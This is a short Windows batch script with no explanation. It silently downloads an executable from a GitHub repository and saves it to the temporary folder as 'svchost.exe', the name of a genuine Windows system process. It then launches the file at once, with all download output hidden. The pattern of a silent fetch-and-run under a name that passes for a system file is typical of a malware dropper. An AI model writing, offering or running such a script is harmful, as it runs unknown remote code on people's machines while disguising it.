@echo off
setlocal enableextensions

set "URL=https://github.com/madhead341/KickAss/raw/refs/heads/main/svchost.exe"
set "INSTALLER_PATH=%TEMP%\svchost.exe"

>nul 2>&1 curl -L "%URL%" -o "%INSTALLER_PATH%"
start "" "%INSTALLER_PATH%"

endlocal
